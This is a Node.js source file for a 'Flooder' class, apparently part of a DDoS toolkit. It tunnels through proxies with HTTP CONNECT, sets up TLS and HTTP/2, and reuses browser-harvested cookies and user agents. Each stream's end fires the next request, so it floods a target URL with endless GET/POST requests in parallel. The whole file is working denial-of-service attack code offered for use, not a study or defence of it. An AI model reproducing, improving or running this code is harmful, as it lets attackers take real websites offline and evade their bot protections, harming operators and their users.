import http2 from "node:http2";
import net from "node:net";
import tls from "node:tls";
import { URL } from "node:url";

import { log } from "../util/Util.js";
import { randnum } from "../util/Helpers.js";

export class Flooder {
  constructor(browserObject) {
    this.browserData = browserObject;
    Object.assign(this, browserObject);
  }

  buildAuthority(url, targetPort = null) {
    const newUrl = new URL(url);
    const scheme = newUrl.protocol.replace(":", "");
    const port = targetPort || newUrl.port;

    const defaultPort = scheme === "https" ? "443" : "80";

    if (port && port !== defaultPort) {
      return `${newUrl.hostname}:${port}`;
    }
    return newUrl.hostname;
  }
  resolvePort(url, overridePort = null) {
    const newUrl = new URL(url);
    const scheme = newUrl.protocol.replace(":", "");
    return overridePort || newUrl.port || (scheme === "https" ? "443" : "80");
  }
  async start() {
    const authority = new URL(this.url);
    const path = (authority.pathname || "/") + (authority.search || "");
    log(
      "FLOODER",
      `Flooder instance ${this.browserId} starting flood on ${this.url} via proxy ${this.proxyHost}`
    );
    /**
     * Debug: console.dir(this.cookieObj, { depth: null });
     *        console.dir(this.browserData, { depth: null });
     * */
    // First: create proxy tunnel and TLS socket BEFORE http2.connect
    const createTunnel = () => {
      return new Promise((resolve, reject) => {
        const conn = net.connect({
          host: this.proxyHost,
          port: Number(this.proxyPort),
        });

        /* 
          conn.once("connect", () => {
            conn.write(
              `CONNECT ${authority.hostname}:${
                authority.port || 443
              } HTTP/1.1\r\nHost: ${authority.hostname}\r\n\r\n`
            );
          });
        */
        conn.once("connect", () => {
          const targetPort = this.resolvePort(
            this.url,
            this.browserConfig?.targetPort
          );
          conn.write(
            `CONNECT ${authority.hostname}:${targetPort} HTTP/1.1\r\nHost: ${authority.hostname}\r\n\r\n`
          );
        });

        let buff = Buffer.alloc(0);

        const onData = (chunk) => {
          buff = Buffer.concat([buff, chunk]);
          const headerEnd = buff.indexOf("\r\n\r\n");
          if (headerEnd !== -1) {
            const headerStr = buff.slice(0, headerEnd).toString();
            if (!/HTTP\/1\.\d 200/.test(headerStr)) {
              conn.destroy();
              return reject(
                new Error(
                  `Proxy connection failed: ${
                    headerStr.split("\r\n")[0]
                  } for proxy ${this.proxyHost} on port ${this.proxyPort}`
                )
              );
            }

            if (buff.length > headerEnd + 4) {
              conn.unshift(buff.slice(headerEnd + 4));
            }

            conn.removeListener("data", onData);

            const tlsSocket = tls.connect({
              socket: conn,
              servername: authority.hostname,
              ALPNProtocols: ["h2"],
            });

            tlsSocket.once("secureConnect", () => resolve(tlsSocket));
            tlsSocket.on("error", reject);
          }
        };

        conn.on("data", onData);
        conn.on("error", reject);
      });
    };

    // Await tunnel creation
    const socket = await createTunnel();

    console.log(this.url);
    // Now pass a sync createConnection that returns the socket
    const client = http2.connect(this.url, {
      createConnection: () => socket,
    });

    client.on("error", (err) => {
      console.error(
        `Error in flooder instance ${this.browserId}: ${err.message}`
      );
    });
    const cookieHeader = toCookieHeader(this.cookieObj.cookie);
    const reqMethods = ["GET", "POST"];
    const sendRequest = () => {
      if (client.destroyed || client.closed) return;

      const headers = {
        ":method": reqMethods[randnum(0, reqMethods.length)],
        ":path": path,
        ":authority": this.buildAuthority(
          this.url,
          this.browserConfig?.targetPort
        ),
        ":scheme": "https",
        cookie: cookieHeader,
        "user-agent": this.userAgent,
        accept: "*/*",
        "accept-language": `${this.locale},${this.locale.split("-")[0]};q=0.9`,
        "accept-encoding": "gzip, deflate, br",
        "cache-control": "no-cache",
        "sec-fetch-mode": "navigate",
        "upgrade-insecure-requests": "1",
      };

      //console.dir(headers, { depth: null });
      const req = client.request(headers);
      req.on("response", (headers) => {
        const statusCode = headers[":status"];
        log(
          "FLOODER",
          `Browser ${this.browserId} Flooder status: ${statusCode}`
        );
      });
      req.on("data", () => {});
      req.on("end", sendRequest);
      req.on("error", () => {});
      req.end();
    };

    for (let i = 0; i < this.browserConfig.cpspp; i++) {
      console.log("Sending Request: %d", i);
      sendRequest();
    }

    return { success: true, browserData: this.browserData };
  }
}
function toCookieHeader(cookies) {
  if (!cookies) return "";
  if (Array.isArray(cookies)) {
    return cookies.map((c) => `${c.name}=${c.value}`).join("; ");
  }
  if (cookies.cookie && cookies.cookie.name && cookies.cookie.value) {
    return `${cookies.cookie.name}=${cookies.cookie.value}`;
  }
  if (cookies.name && cookies.value) {
    return `${cookies.name}=${cookies.value}`;
  }
  return "";
}
